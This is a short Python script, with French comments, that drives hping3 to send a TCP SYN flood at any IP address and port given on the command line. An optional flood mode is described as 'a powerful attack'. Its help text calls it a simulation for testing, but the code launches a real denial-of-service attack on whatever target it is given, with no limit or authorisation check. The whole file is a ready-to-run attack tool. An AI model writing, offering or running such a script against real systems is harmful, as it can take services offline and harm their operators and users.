import subprocess
import argparse

def ddos_attack(target_ip, target_port, flood=False):
    try:
        if flood:
            print(f"Starting Flood DDoS attack on {target_ip}:{target_port}")
            command = [
                "sudo", "hping3", target_ip,
                "-S",  # TCP SYN
                "-p", str(target_port),  # Port cible
                "--flood"  # Mode flood
            ]
        else:
            print(f"Starting DDoS attack on {target_ip}:{target_port} with default packet count")
            command = [
                "sudo", "hping3", target_ip,
                "-S",  # TCP SYN
                "-p", str(target_port)  # Port cible
            ]
        subprocess.run(command)
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulate a DDoS attack for testing purposes.")
    parser.add_argument("target_ip", help="The target IP address of the attack.")
    parser.add_argument("target_port", type=int, help="The target port of the attack.")
    parser.add_argument("--flood", action="store_true", help="Enable flood mode for a powerful attack.")

    args = parser.parse_args()
    ddos_attack(args.target_ip, args.target_port, flood=args.flood)
